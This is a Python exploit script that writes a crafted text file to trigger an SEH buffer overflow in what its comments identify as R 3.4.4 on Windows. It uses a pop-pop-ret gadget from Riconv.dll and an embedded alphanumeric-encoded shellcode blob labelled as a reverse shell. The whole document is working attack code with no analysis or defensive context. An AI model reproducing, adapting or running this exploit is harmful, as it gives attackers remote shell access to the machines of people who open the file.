#!/usr/bin/python

import struct

filename="r344.txt"

revshell =  b""
revshell += b"\x54\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
revshell += b"\x49\x49\x49\x49\x49\x49\x37\x51\x5a\x6a\x41\x58"
revshell += b"\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42"
revshell += b"\x32\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41"
revshell += b"\x42\x75\x4a\x49\x69\x6c\x4d\x38\x4b\x32\x75\x50"
revshell += b"\x47\x70\x57\x70\x63\x50\x6f\x79\x6a\x45\x44\x71"
revshell += b"\x39\x50\x55\x34\x6c\x4b\x66\x30\x44\x70\x4c\x4b"
revshell += b"\x33\x62\x36\x6c\x6c\x4b\x42\x72\x77\x64\x6e\x6b"
revshell += b"\x61\x62\x64\x68\x44\x4f\x4f\x47\x43\x7a\x36\x46"
revshell += b"\x76\x51\x4b\x4f\x4c\x6c\x77\x4c\x35\x31\x33\x4c"
revshell += b"\x66\x62\x56\x4c\x77\x50\x4f\x31\x38\x4f\x44\x4d"
revshell += b"\x35\x51\x79\x57\x38\x62\x7a\x52\x50\x52\x32\x77"
revshell += b"\x4e\x6b\x73\x62\x62\x30\x4c\x4b\x33\x7a\x35\x6c"
revshell += b"\x6c\x4b\x42\x6c\x64\x51\x30\x78\x6a\x43\x62\x68"
revshell += b"\x46\x61\x4e\x31\x63\x61\x4c\x4b\x56\x39\x77\x50"
revshell += b"\x56\x61\x4e\x33\x4e\x6b\x67\x39\x56\x78\x68\x63"
revshell += b"\x75\x6a\x67\x39\x6c\x4b\x44\x74\x6c\x4b\x35\x51"
revshell += b"\x5a\x76\x55\x61\x6b\x4f\x6c\x6c\x4b\x71\x7a\x6f"
revshell += b"\x46\x6d\x57\x71\x38\x47\x75\x68\x4d\x30\x42\x55"
revshell += b"\x39\x66\x75\x53\x71\x6d\x6a\x58\x37\x4b\x61\x6d"
revshell += b"\x51\x34\x74\x35\x79\x74\x33\x68\x6e\x6b\x51\x48"
revshell += b"\x74\x64\x73\x31\x4e\x33\x52\x46\x4e\x6b\x54\x4c"
revshell += b"\x50\x4b\x4c\x4b\x31\x48\x45\x4c\x73\x31\x38\x53"
revshell += b"\x6c\x4b\x53\x34\x4c\x4b\x35\x51\x4e\x30\x4d\x59"
revshell += b"\x42\x64\x76\x44\x66\x44\x71\x4b\x43\x6b\x30\x61"
revshell += b"\x51\x49\x50\x5a\x63\x61\x39\x6f\x39\x70\x71\x4f"
revshell += b"\x63\x6f\x71\x4a\x6c\x4b\x77\x62\x7a\x4b\x6c\x4d"
revshell += b"\x53\x6d\x55\x38\x56\x53\x37\x42\x67\x70\x67\x70"
revshell += b"\x52\x48\x43\x47\x44\x33\x46\x52\x71\x4f\x32\x74"
revshell += b"\x61\x78\x52\x6c\x73\x47\x35\x76\x65\x57\x59\x6f"
revshell += b"\x39\x45\x48\x38\x6e\x70\x33\x31\x55\x50\x37\x70"
revshell += b"\x46\x49\x6f\x34\x42\x74\x72\x70\x42\x48\x77\x59"
revshell += b"\x4d\x50\x62\x4b\x75\x50\x6b\x4f\x79\x45\x46\x30"
revshell += b"\x66\x30\x50\x50\x46\x30\x37\x30\x66\x30\x57\x30"
revshell += b"\x36\x30\x55\x38\x38\x6a\x76\x6f\x79\x4f\x6d\x30"
revshell += b"\x6b\x4f\x69\x45\x6e\x77\x73\x5a\x44\x45\x61\x78"
revshell += b"\x6f\x30\x4e\x48\x52\x44\x32\x55\x65\x38\x37\x72"
revshell += b"\x43\x30\x42\x31\x43\x6c\x6b\x39\x6a\x46\x70\x6a"
revshell += b"\x32\x30\x33\x66\x32\x77\x63\x58\x5a\x39\x39\x35"
revshell += b"\x50\x74\x43\x51\x79\x6f\x6b\x65\x6c\x45\x4b\x70"
revshell += b"\x63\x44\x54\x4c\x79\x6f\x32\x6e\x56\x68\x70\x75"
revshell += b"\x68\x6c\x70\x68\x38\x70\x68\x35\x79\x32\x63\x66"
revshell += b"\x49\x6f\x78\x55\x42\x48\x65\x33\x42\x4d\x32\x44"
revshell += b"\x37\x70\x6f\x79\x78\x63\x50\x57\x71\x47\x71\x47"
revshell += b"\x30\x31\x5a\x56\x61\x7a\x67\x62\x76\x39\x70\x56"
revshell += b"\x6b\x52\x79\x6d\x75\x36\x6a\x67\x71\x54\x66\x44"
revshell += b"\x35\x6c\x33\x31\x46\x61\x6c\x4d\x43\x74\x66\x44"
revshell += b"\x36\x70\x6a\x66\x75\x50\x72\x64\x51\x44\x52\x70"
revshell += b"\x53\x66\x61\x46\x70\x56\x77\x36\x62\x76\x72\x6e"
revshell += b"\x30\x56\x73\x66\x62\x73\x73\x66\x62\x48\x70\x79"
revshell += b"\x48\x4c\x65\x6f\x6c\x46\x4b\x4f\x6a\x75\x6e\x69"
revshell += b"\x39\x70\x50\x4e\x76\x36\x43\x76\x69\x6f\x66\x50"
revshell += b"\x70\x68\x63\x38\x6e\x67\x35\x4d\x33\x50\x39\x6f"
revshell += b"\x38\x55\x6f\x4b\x5a\x50\x58\x35\x6c\x62\x73\x66"
revshell += b"\x61\x78\x69\x36\x6d\x45\x6d\x6d\x6f\x6d\x4b\x4f"
revshell += b"\x7a\x75\x55\x6c\x65\x56\x31\x6c\x64\x4a\x6d\x50"
revshell += b"\x59\x6b\x6d\x30\x62\x55\x57\x75\x6f\x4b\x52\x67"
revshell += b"\x77\x63\x54\x32\x30\x6f\x33\x5a\x75\x50\x56\x33"
revshell += b"\x79\x6f\x49\x45\x41\x41"




alignStackJmpESP = "\x54\x58\x66\x05\x4C\x06\x50\x5C\xFF\xE4"


jmpAbuffer = "\xE9\x6F\xFC\xFF\xFF"

nSEH = "\xEB\x06\x90\x90"            # Jump to the D buffer
SEH  = struct.pack("<I", 0x643c236e) # 0x643c236e : pop esi # pop edi # ret  | asciiprint,ascii {PAGE_EXECUTE_READ} - (C:\Program Files\R\R-3.4.4\bin\i386\Riconv.dll)


buffer = alignStackJmpESP
buffer += "A" * 6
buffer += revshell
buffer += "A" * (900 - len(buffer))
buffer += nSEH
buffer += SEH
buffer += jmpAbuffer
buffer += "D" * (12000 - len(buffer))

textfile = open(filename , 'w')
textfile.write(buffer)
textfile.close()


